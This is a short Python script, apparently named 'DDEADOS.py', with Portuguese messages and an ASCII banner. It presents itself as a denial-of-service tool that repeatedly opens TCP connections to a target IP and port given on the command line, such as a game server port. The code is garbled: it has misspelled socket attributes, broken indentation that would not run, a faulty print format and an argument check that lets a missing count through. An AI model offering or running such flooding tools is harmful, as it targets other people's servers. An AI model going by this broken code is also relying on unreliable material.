import socket
import sys
import os

main = """
  ____  ____  _____ ____  ____  ____  ____ 
 /  _ \/  _ \/  __//  _ \/  _ \/  _ \/ ___\
 | | \|| | \||  \  | / \|| | \|| / \||    \
 | |_/|| |_/||  /_ | |-||| |_/|| \_/|\___ |
 \____/\____/\____\\_/ \|\____/\____/\____/
 
Powered By FroostSingGN\n\n"""
count = 0

def init(ip, port, main):
    client = socket.socket(socke.AF_INET, socket.SOCKE_STREAM)
    client.settimeout(0.03)
    code = client.connect_ex((ip, int(port)))
    if code == 0:
        print("|> Attack Sendo Realizado!")
        print("IP: %s, PORT:%s", ip, port)
 else:
        print("Erro!\n")
        
if len(sys.argv) < 3:
    print("\n\n")
    print("Modo De Uso: ")
    print("Ex: |> python DDEADOS.py 192.198.1.1 25565")
    print("\n\n")
    sys.exit(0)
    
else:
    
    ip = sys.argv[1]
    port = sys.argv[2]
    quantia = int(sys.argv[3])
    while count < quantia:
        count+=1
        init(ip, port, main)
   print("|> Parado...")

